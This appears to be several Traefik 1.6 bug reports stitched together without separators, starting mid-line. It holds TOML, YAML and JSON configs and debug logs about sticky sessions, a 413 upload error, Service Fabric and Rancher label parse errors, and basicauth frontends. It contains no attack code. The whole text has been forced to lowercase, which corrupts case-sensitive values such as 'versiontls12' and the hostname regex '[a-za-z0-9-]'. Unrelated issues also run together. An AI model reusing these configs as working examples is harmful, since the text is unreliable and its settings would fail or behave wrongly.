true acmelogging = true [acme.httpchallenge] entrypoint = "http"
```
loglevel = "info"
defaultentrypoints = ["http"] [api] [api.statistics] recenterrors = 100 [file]
watch = true
filename = "/etc/traefik/rules.toml" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "docker.local"
watch = true
exposedbydefault = false [entrypoints] [entrypoints.traefik] address = ":8082" [entrypoints.http] address = ":80" ``` #### test websocket echo server ```yml
version: '3'
services: ws: image: gaetancollaud/websocket-echo-server labels: - "traefik.enable=true" - "traefik.frontend.rule=pathprefix:/ws-echo" - "traefik.port=8080" - "traefik.backend.loadbalancer.stickiness=true" - "traefik.backend.loadbalancer.stickiness.cookiename=lb_traefik"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
this is the log just after i started my container we can see that the sticky session is enabled with the cookie name _lb_traefik_: `sticky session with cookie lb_traefik`.
time="2018-05-17t12:44:14z" level=debug msg="provider event received {status:start id:545f5ffa9672abc6ccf7d015097d36f334f5510106d2fc4a94eef8e9592d70a6 from:gaetancollaud/websocket-echo-server type:container action:start actor:{id:545f5ffa9672abc6ccf7d015097d36f334f5510106d2fc4a94eef8e9592d70a6 attributes:map[com.docker.compose.version:1.19.0 com.docker.compose.service:ws traefik.docker.network:dockerdev_backend com.docker.compose.config-hash:891a6338d453fe2d40981f41319de6b4c34c021407f0f757672e96e7e38c62fb com.docker.compose.container-number:1 image:gaetancollaud/websocket-echo-server name:websocketechoserver_ws_1 traefik.backend.loadbalancer.stickiness:true traefik.backend.loadbalancer.stickiness.cookiename:lb_traefik traefik.enable:true traefik.port:8080 com.docker.compose.oneoff:false com.docker.compose.project:websocketechoserver traefik.frontend.rule:pathprefix:/ws-echo]} scope:local time:1526561054 timenano:1526561054641414841}"
time="2018-05-17t12:44:14z" level=debug msg="originlabelsmap[com.docker.compose.project:websocketechoserver com.docker.compose.service:ws com.docker.compose.version:1.19.0 traefik.backend.loadbalancer.stickiness.cookiename:lb_traefik traefik.docker.network:dockerdev_backend traefik.port:8080 com.docker.compose.config-hash:891a6338d453fe2d40981f41319de6b4c34c021407f0f757672e96e7e38c62fb com.docker.compose.container-number:1 com.docker.compose.oneoff:false traefik.backend.loadbalancer.stickiness:true traefik.enable:true traefik.frontend.rule:pathprefix:/ws-echo]"
time="2018-05-17t12:44:14z" level=debug msg="alllabelsmap[:map[traefik.backend.loadbalancer.stickiness:true traefik.enable:true traefik.frontend.rule:pathprefix:/ws-echo traefik.backend.loadbalancer.stickiness.cookiename:lb_traefik traefik.docker.network:dockerdev_backend traefik.port:8080]]"
time="2018-05-17t12:44:14z" level=debug msg="filtering disabled container /vpdev-traefik"
time="2018-05-17t12:44:14z" level=debug msg="originlabelsmap[com.docker.compose.project:websocketechoserver com.docker.compose.service:ws com.docker.compose.version:1.19.0 traefik.backend.loadbalancer.stickiness.cookiename:lb_traefik traefik.docker.network:dockerdev_backend traefik.port:8080 com.docker.compose.config-hash:891a6338d453fe2d40981f41319de6b4c34c021407f0f757672e96e7e38c62fb com.docker.compose.container-number:1 com.docker.compose.oneoff:false traefik.backend.loadbalancer.stickiness:true traefik.enable:true traefik.frontend.rule:pathprefix:/ws-echo]"
time="2018-05-17t12:44:14z" level=debug msg="alllabelsmap[:map[traefik.docker.network:dockerdev_backend traefik.port:8080 traefik.backend.loadbalancer.stickiness:true traefik.enable:true traefik.frontend.rule:pathprefix:/ws-echo traefik.backend.loadbalancer.stickiness.cookiename:lb_traefik]]"
time="2018-05-17t12:44:14z" level=debug msg="configuration received from provider docker: {\\"backends\\":{\\"backend-ws-websocketechoserver\\":{\\"servers\\":{\\"server-websocketechoserver-ws-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\",\\"stickiness\\":{\\"cookiename\\":\\"lb_traefik\\"}}}},\\"frontends\\":{\\"frontend-pathprefix-ws-echo-0\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-ws-websocketechoserver\\",\\"routes\\":{\\"route-frontend-pathprefix-ws-echo-0\\":{\\"rule\\":\\"pathprefix:/ws-echo\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]}}}"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend frontend-pathprefix-ws-echo-0"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend frontend-pathprefix-ws-echo-0 to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route route-frontend-pathprefix-ws-echo-0 pathprefix:/ws-echo"
time="2018-05-17t12:44:14z" level=debug msg="creating backend backend-ws-websocketechoserver"
time="2018-05-17t12:44:14z" level=debug msg="creating load-balancer wrr"
time="2018-05-17t12:44:14z" level=debug msg="sticky session with cookie lb_traefik"
time="2018-05-17t12:44:14z" level=debug msg="creating server server-websocketechoserver-ws-1 at with weight 1"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend angular"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend angular to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route test_1 pathprefix:/angular,/sockjs-node"
time="2018-05-17t12:44:14z" level=debug msg="creating backend angular"
time="2018-05-17t12:44:14z" level=debug msg="creating load-balancer wrr"
time="2018-05-17t12:44:14z" level=debug msg="creating server server1 at with weight 0"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend audit"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend audit to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route test_1 pathprefix:/audit-api"
time="2018-05-17t12:44:14z" level=debug msg="creating backend audit"
time="2018-05-17t12:44:14z" level=debug msg="creating load-balancer wrr"
time="2018-05-17t12:44:14z" level=debug msg="creating server server1 at with weight 0"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend base"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend base to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route test_1 pathprefix:/"
time="2018-05-17t12:44:14z" level=debug msg="reusing backend angular"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend keycloak"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend keycloak to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route test_1 pathprefix:/auth"
time="2018-05-17t12:44:14z" level=debug msg="creating backend keycloak"
time="2018-05-17t12:44:14z" level=debug msg="creating load-balancer wrr"
time="2018-05-17t12:44:14z" level=debug msg="creating server server1 at with weight 0"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend streamedian"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend streamedian to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route test_1 pathprefix:/streamedian,/ext-lib"
time="2018-05-17t12:44:14z" level=debug msg="creating backend whitelabel"
time="2018-05-17t12:44:14z" level=debug msg="creating load-balancer wrr"
time="2018-05-17t12:44:14z" level=debug msg="creating server server1 at with weight 0"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend test"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend test to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route test_1 pathprefix:/test"
time="2018-05-17t12:44:14z" level=debug msg="creating backend test"
time="2018-05-17t12:44:14z" level=debug msg="creating load-balancer wrr"
time="2018-05-17t12:44:14z" level=debug msg="creating server server1 at with weight 0"
time="2018-05-17t12:44:14z" level=debug msg="creating frontend whitelabel"
time="2018-05-17t12:44:14z" level=debug msg="wiring frontend whitelabel to entrypoint http"
time="2018-05-17t12:44:14z" level=debug msg="creating route test_1 pathprefix:/wl"
time="2018-05-17t12:44:14z" level=debug msg="reusing backend whitelabel"
time="2018-05-17t12:44:14z" level=info msg="server configuration reloaded on :8082"
time="2018-05-17t12:44:14z" level=info msg="server configuration reloaded on :80"
docker ubuntu ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/values/input\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"keep-alive\\"],\\"content-length\\":[\\"4711800\\"],\\"content-type\\":[\\"multipart/form-data; boundary=\\\\\\"5fb061c0-7136-4be7-9063-d73ac5029452\\\\\\"\\"],\\"expect\\":[\\"100-continue\\"],\\"x-forwarded-prefix\\":[\\"/\\"]},\\"contentlength\\":4711800,\\"transferencoding\\":null,\\"host\\":\\"prosim4101.dhcp.db.de\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.24.67.195:63401\\",\\"requesturi\\":\\"/api/values/input\\",\\"tls\\":null}"
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/values/input\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"keep-alive\\"],\\"content-length\\":[\\"4711800\\"],\\"content-type\\":[\\"multipart/form-data; boundary=\\\\\\"5fb061c0-7136-4be7-9063-d73ac5029452\\\\\\"\\"],\\"expect\\":[\\"100-continue\\"],\\"x-forwarded-prefix\\":[\\"/\\"]},\\"contentlength\\":4711800,\\"transferencoding\\":null,\\"host\\":\\"prosim4101.dhcp.db.de\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.24.67.195:63401\\",\\"requesturi\\":\\"/api/values/input\\",\\"tls\\":null}" forwardurl=" "
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.19.0.17:80\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"keep-alive\\"],\\"content-length\\":[\\"4711800\\"],\\"content-type\\":[\\"multipart/form-data; boundary=\\\\\\"5fb061c0-7136-4be7-9063-d73ac5029452\\\\\\"\\"],\\"expect\\":[\\"100-continue\\"],\\"x-forwarded-prefix\\":[\\"/\\"]},\\"contentlength\\":4711800,\\"transferencoding\\":null,\\"host\\":\\"prosim4101.dhcp.db.de\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.24.67.195:63401\\",\\"requesturi\\":\\"/api/values/input\\",\\"tls\\":null}"
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.19.0.17:80\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"keep-alive\\"],\\"content-length\\":[\\"4711800\\"],\\"content-type\\":[\\"multipart/form-data; boundary=\\\\\\"5fb061c0-7136-4be7-9063-d73ac5029452\\\\\\"\\"],\\"expect\\":[\\"100-continue\\"],\\"x-forwarded-prefix\\":[\\"/\\"]},\\"contentlength\\":4711800,\\"transferencoding\\":null,\\"host\\":\\"prosim4101.dhcp.db.de\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.24.67.195:63401\\",\\"requesturi\\":\\"/api/values/input\\",\\"tls\\":null}"
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 413, length: 199, duration: 1.1266ms"
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.19.0.17:80\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"keep-alive\\"],\\"content-length\\":[\\"4711800\\"],\\"content-type\\":[\\"multipart/form-data; boundary=\\\\\\"5fb061c0-7136-4be7-9063-d73ac5029452\\\\\\"\\"],\\"expect\\":[\\"100-continue\\"],\\"x-forwarded-prefix\\":[\\"/\\"]},\\"contentlength\\":4711800,\\"transferencoding\\":null,\\"host\\":\\"prosim4101.dhcp.db.de\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.24.67.195:63401\\",\\"requesturi\\":\\"/api/values/input\\",\\"tls\\":null}"
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.19.0.17:80\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"keep-alive\\"],\\"content-length\\":[\\"4711800\\"],\\"content-type\\":[\\"multipart/form-data; boundary=\\\\\\"5fb061c0-7136-4be7-9063-d73ac5029452\\\\\\"\\"],\\"expect\\":[\\"100-continue\\"],\\"x-forwarded-prefix\\":[\\"/\\"]},\\"contentlength\\":4711800,\\"transferencoding\\":null,\\"host\\":\\"prosim4101.dhcp.db.de\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.24.67.195:63401\\",\\"requesturi\\":\\"/api/values/input\\",\\"tls\\":null}"
time="2018-05-15t10:01:16z" level=debug msg="vulcand/oxy/roundrobin/rr: competed servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/values/input\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"keep-alive\\"],\\"content-length\\":[\\"4711800\\"],\\"content-type\\":[\\"multipart/form-data; boundary=\\\\\\"5fb061c0-7136-4be7-9063-d73ac5029452\\\\\\"\\"],\\"expect\\":[\\"100-continue\\"],\\"x-forwarded-prefix\\":[\\"/\\"]},\\"contentlength\\":4711800,\\"transferencoding\\":null,\\"host\\":\\"prosim4101.dhcp.db.de\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.24.67.195:63401\\",\\"requesturi\\":\\"/api/values/input\\",\\"tls\\":null}"
*provider: service fabric v6.1.480.9494*
*platform: windows server 2016 datacenter* ```toml
################################################################
# global configuration
################################################################ insecureskipverify = true # enable debug mode
# default: false
debug = true # traefik logs file
# if not defined, logs to stdout
# [traefiklog] filepath = "traefik.log" # log level
# default: "error" loglevel = "error" # entrypoints to be used by frontends that do not specify any entrypoint.
# each frontend can specify its own entrypoints.
# default: ["http"]
defaultentrypoints = ["https","http"] # entrypoints definition
[entrypoints] [entrypoints.http] address = ":30080" [entrypoints.https] address = ":30443" [entrypoints.https.proxyprotocol] insecure = true [entrypoints.https.tls] [entrypoints.https.tls.clientca] optional = true [[entrypoints.https.tls.certificates]] certfile = "localhost.cert" keyfile = "localhost.key"
[entrypoints.traefik]
address = ":38080" ################################################################
# api definition
################################################################ [api] # name of the related entry point # # optional # default: "traefik" # entrypoint = "traefik" # enabled dashboard # # optional # default: true # dashboard = true ################################################################
# service fabric provider
################################################################ # enable service fabric configuration backend
[servicefabric] # service fabric management endpoint
clustermanagementurl = " " # service fabric management endpoint api version
apiversion = "3.0" # enable tls connection.
[servicefabric.tls] cert = "traefikcert.crt" key = "traefikkey.key" insecureskipverify = true caoptional = true ``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
time="2018-05-11t19:54:07z" level=error msg="provider connection error: near line 133 (last key parsed \'frontends.frontend-fabric:/borkservice/borkservice.entrypoints\'): expected a comma or array terminator \']\', but got \'h\' instead; retrying in 1.008273491s"
<summary>docker-compose from rancher interface:</summary> ```yaml
version: '2'
services: error: image: docker.ops.domain2.com/ops-errorpages:latest labels: traefik.frontend.rule: host:errorpages.qa.domain2.xyz traefik.enable: \'true\' traefik.backend: errorpages traefik.tags: external logforwarding: \'true\' io.rancher.scheduler.affinity:host_label: web=true traefik.port: \'80\' io.rancher.container.hostname_override: container_name webtest: image: docker.ops.domain2.com/bou-web:latest labels: role: web traefik.enable: \'true\' traefik.tags: external,web,bou logforwarding: \'true\' project: bou traefik.port: \'80\' io.rancher.container.pull_image: always traefik.frontend.rule: host:bouweb.qa.domain2.xyz io.rancher.scheduler.affinity:container_label_ne: io.rancher.stack_service.name=$${stack_name}/$${service_name} traefik.frontend.errors.bouweb404.status: \'["404"]\' ####note: i\'ve tried both with and without quotes & just the number alone### io.rancher.scheduler.affinity:host_label: web=true io.rancher.container.hostname_override: container_name traefik.frontend.errors.bouweb404.query: /bou/error_404.html traefik.frontend.errors.bouweb404.backend: errorpages
``` </details> <details>
<summary># traefik.toml</summary> ```toml debug = true
loglevel = "info"
insecureskipverify = false
defaultentrypoints = ["http", "https"]
sendanonymoususage = false [traefiklog] filepath = "/opt/traefik/log/traefik.log" [accesslog] filepath = "/opt/traefik/log/access.log" [respondingtimeouts] readtimeout = "0s" writetimeout = "0s" idletimeout = "180s" [forwardingtimeouts] dialtimeout = "30s" responseheadertimeout = "0s" [entrypoints] [entrypoints.traefik] address = ":8000" compress = true [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] minversion = "versiontls12" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.domain1.com.crt" keyfile = "/opt/traefik/certs/star.domain1.com.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.corp.domain2.com.crt" keyfile = "/opt/traefik/certs/star.corp.domain2.com.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.dev.domain2.xyz.crt" keyfile = "/opt/traefik/certs/star.dev.domain2.xyz.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.ops.domain2.com.crt" keyfile = "/opt/traefik/certs/star.ops.domain2.com.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.prd.domain2.com.crt" keyfile = "/opt/traefik/certs/star.prd.domain2.com.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.qa.domain2.xyz.crt" keyfile = "/opt/traefik/certs/star.qa.domain2.xyz.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.domain3.com.crt" keyfile = "/opt/traefik/certs/star.domain3.com.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.domain2.com.crt" keyfile = "/opt/traefik/certs/star.domain2.com.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.uat.domain3.com.crt" keyfile = "/opt/traefik/certs/star.uat.domain3.com.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/star.uat.domain2.xyz.crt" keyfile = "/opt/traefik/certs/star.uat.domain2.xyz.key" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/traefik.crt" keyfile = "/opt/traefik/certs/traefik.key" [api] entrypoint = "traefik" dashboard = true debug = true [api.statistics] recenterrors = 10 [rest] entrypoint = "traefik" [ping] entrypoint = "traefik" [rancher] domain = "qa.domain2.xyz" watch = true refreshseconds = 15 exposedbydefault = false enableservicehealthfilter = false constraints = [ "tag==external" ] [rancher.metadata] intervalpoll = false prefix = "/2016-07-29"
``` </details> <details>
<summary>json</summary> ```json
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": null, "file": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "configfile": ""
``` </details> ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) <details>
<summary>logs</summary> ```
5/9/2018 2:09:43 pm'traefik' process is not running
5/9/2018 2:09:43 pm'traefik' process is not running
5/9/2018 2:09:43 pm'traefik' trying to restart
5/9/2018 2:09:43 pm'traefik' start: '/opt/traefik/bin/traefik-service.sh start'
5/9/2018 2:09:43 pmwed may 9 14:09:43 cdt 2018 - [ generating traefik configuration..
5/9/2018 2:09:43 pmwed may 9 14:09:43 cdt 2018 - [ redirecting traefik log..
5/9/2018 2:09:43 pmwed may 9 14:09:43 cdt 2018 - [ redirecting traefik log..
5/9/2018 2:09:43 pmwed may 9 14:09:43 cdt 2018 - [ starting traefik..
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="using toml configuration file /opt/traefik/etc/traefik.toml"
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="traefik version v1.6.0 built on 2018-04-30_09:28:44pm"
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="preparing server traefik &{address::8000 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="starting server on :8000"
5/9/2018 2:09:43 pmtime="2018-05-09t14:09:43-05:00" level=info msg="starting server on :80"
5/9/2018 2:09:44 pmtime="2018-05-09t14:09:44-05:00" level=info msg="starting provider configuration.provideraggregator {}"
5/9/2018 2:09:44 pmtime="2018-05-09t14:09:44-05:00" level=info msg="starting server on :443"
5/9/2018 2:09:44 pmtime="2018-05-09t14:09:44-05:00" level=info msg="starting provider *rest.provider {\\"entrypoint\\":\\"traefik\\"}"
5/9/2018 2:09:44 pmtime="2018-05-09t14:09:44-05:00" level=info msg="starting provider *rancher.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[\\"tag==external\\"],\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"accesskey\\":\\"\\",\\"secretkey\\":\\"\\",\\"api\\":null,\\"metadata\\":{\\"intervalpoll\\":false,\\"prefix\\":\\"/2016-07-29\\"},\\"domain\\":\\"qa.domain2.xyz\\",\\"refreshseconds\\":15,\\"exposedbydefault\\":false,\\"enableservicehealthfilter\\":false}"
5/9/2018 2:09:44 pmtime="2018-05-09t14:09:44-05:00" level=error msg="near line 569 (last key parsed \'frontends.frontend-host-bouweb-qa-domain2-xyz.errors.bouweb404.status\'): expected a comma or array terminator \']\', but got \'4\' instead"
5/9/2018 2:09:46 pmtime="2018-05-09t14:09:46-05:00" level=error msg="near line 569 (last key parsed \'frontends.frontend-host-bouweb-qa-domain2-xyz.errors.bouweb404.status\'): expected a comma or array terminator \']\', but got \'4\' instead"
5/9/2018 2:09:47 pmtime="2018-05-09t14:09:47-05:00" level=error msg="near line 569 (last key parsed \'frontends.frontend-host-bouweb-qa-domain2-xyz.errors.bouweb404.status\'): expected a comma or array terminator \']\', but got \'4\' instead"
5/9/2018 2:09:50 pmtime="2018-05-09t14:09:50-05:00" level=error msg="near line 569 (last key parsed \'frontends.frontend-host-bouweb-qa-domain2-xyz.errors.bouweb404.status\'): expected a comma or array terminator \']\', but got \'4\' instead"
5/9/2018 2:09:52 pmtime="2018-05-09t14:09:52-05:00" level=error msg="near line 569 (last key parsed \'frontends.frontend-host-bouweb-qa-domain2-xyz.errors.bouweb404.status\'): expected a comma or array terminator \']\', but got \'4\' instead"
``` </details> i've tried following the examples i found here:
`helm install stable/traefik --values traefik.yaml --name traefik --namespace kube-system` and values: ```yml
# traefik.yaml
imagetag: 1.6.0
ssl: enabled: true enforced: true
acme: enabled: true email: <email> challengetype: http-01 staging: true
dashboard: enabled: true domain: <url> auth: basic: <auth mapping>
rbac: enabled: true
<summary>config</summary> ```json
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "/var/log/traefik/access.log", "accesslog": null, "traefiklogsfile": "/var/log/traefik/traefik.log", "traefiklog": null, "tracing": null, "loglevel": "info", "entrypoints": { "http": { "address": "xxxx", "tls": null, "redirect": { "entrypoint": "xxxx" }, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "https": { "address": "xxxx", "tls": { "minversion": "", "ciphersuites": null, "certificates": [], "clientcafiles": null, "clientca": { "files": null, "optional": false } }, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "traefik": { "address": "xxxx", "tls": null, "redirect": null, "auth": { "basic": { "users": null, "usersfile": "xxxx" }, "digest": null, "forward": null, "headerfield": "" }, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": true, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": null, "file": { "watch": true, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "directory": "/etc/traefik/rules.d/" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "traefik", "dashboard": true, "debug": true, "currentconfigurations": null, "statistics": null }, "metrics": null, "ping": null, "configfile": "/etc/traefik/traefik.toml"
``` </details> ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ``` ```
#### backend config
[backends] [backends.backend-nsk0-web0] [backends.backend-nsk0-web0.loadbalancer] method = "drr" [backends.backend-nsk0-web0.servers] [backends.backend-nsk0-web0.servers.external] url = " "
``` #### this is frontend worked not properly
[frontends] [frontends.new] entrypoints = ["http", "https"] backend = "backend-nsk0-web0" passhostheader = true basicauth = [ "test:$apr1$h6uskkkw$igxlp6ewtrsubktrqe8wj/", "test2:$apr1$d9hr9hbb$4hxwguir3hp4esggp/qno0", ] [frontends.new.headers] sslredirect = true ssltemporaryredirect = true [frontends.new.routes] [frontends.new.routes.main] rule = "hostregexp:{subdomain:[a-za-z0-9-]+}.new.domain.com,new.domain.com"
``` #### but this is frontend worked fine
[frontends] [frontends.front-new] entrypoints = ["http", "https"] backend = "backend-nsk0-web0" passhostheader = true basicauth = [ "test:$apr1$h6uskkkw$igxlp6ewtrsubktrqe8wj/", "test2:$apr1$d9hr9hbb$4hxwguir3hp4esggp/qno0", ] [frontends.front-new.headers] sslredirect = true ssltemporaryredirect = true [frontends.front-new.routes] [frontends.front-new.routes.main] rule = "hostregexp:{subdomain:[a-za-z0-9-]+}.new.domain.com,new.domain.com"
